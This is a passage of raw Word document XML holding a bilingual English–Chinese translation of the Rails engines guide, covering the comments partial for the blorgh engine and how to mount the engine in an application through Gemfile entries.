    </w:tbl>
    <w:p w14:paraId="2AB6BEA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这个 engine 不能找到 ‘partial’ 请求来渲染评论。Rails 首先在应用程序的 (</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/dummy</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">目录然后在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录。当不能找到，它将抛出这样的错误。Engine 指定查找 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh/comments/comment</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 因为接收对象的 ‘model’ 来自 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Comment</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBD696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这个 ‘partial’ 模板将会仅仅响应渲染评论文本，直到现在。在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/comments/_comment.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 创建一个文件并且将下面这行放进去：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5640"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="66D621EE" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="608198F7" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1109200785"/>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comment_counter + 1</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;. &lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>comment.text %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3FE09E5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The </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>comment_counter</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> local variable is given to us by the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;%= render @post.comments %&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> call, as it will define this automatically and increment the counter as it iterates through each comment. It’s used in this example to display a small number next to each comment when it’s created. </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>comment_counter</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 当地变量被提供给我们通过（在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">）调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;%= render @post.comments %&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，如果一切正常这将会对评论自身遍历并对每条自动的增加数目。在这个例子中，用它显示每条评论旁边时，它会创建一个小数目。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2728867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That completes the comment function of the blogging engine. Now it’s time to use it within an application. 这里完成了博客 engine 的 评论功能。现在是时候在一个应用程序中使用它们了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BB68E8"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4 Hooking into an application 衔接到一个应用程序中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B478C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Using an engine within an application is very easy. This section covers how to mount the engine into an application and the initial setup required for it, as well as linking the engine to a </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> class provided by the application to provide ownership for posts and comments within the engine. 在一个应用程序中使用一个 engine 非常简单。这部分涵盖了怎样挂载 engine 到一个应用程序并且初始化它需要的设置，正如链接 engine 到由应用程序提供的一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类来保证 engine 中文章和评论的关系。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8A44BC"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4.1 挂载 engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097B9CF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首先，engine 需要被插入到指定应用程序的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件中。如果这里没有合适的一个应用程序来测试（engine），像这样使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails new</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令*在 engine 目录外面**创建一个：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1E83A1E4" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="664274B1" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1150057050"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails new unicorn</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3AE6576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Usually, specifying the engine inside the Gemfile would be done by specifying it as a normal, everyday gem. 一般来说，常规的指定 engine 到 ‘Gemfile’ 也是可以工作的的，日常的 gem。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1440"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="64FF50CD" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="31B417BC" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="776828755"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>gem 'devise'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="31CBA99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因为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 仍然处于开发中，它还会需要一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项在指定它的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> （的语句中）：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="37EA2D15" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D357C30" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="226653597"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>gem 'blorgh', :path</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "/path/to/blorgh"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2DD04AF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如果整个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> engine 目录被复制到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>vendor/engines/blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 然后可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样去指定它：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="6FC026C5" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2AD95C8C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="431978646"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>gem 'blorgh', :path</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "vendor/engines/blorgh"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="399C517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正如先前描述的，通过以放置 gem 到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> （的形式）它将会在 Rails 应用程序启动的时候被导入，如同它将会首先 require 在 engine 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/blorgh.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 以及随后（require 的）</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/blorgh/engine.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，这是定义 engine 的主体功能的文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CED623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要想使得在应用程序中可访问 engine 的功能，engine 需要被挂载到应用程序的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
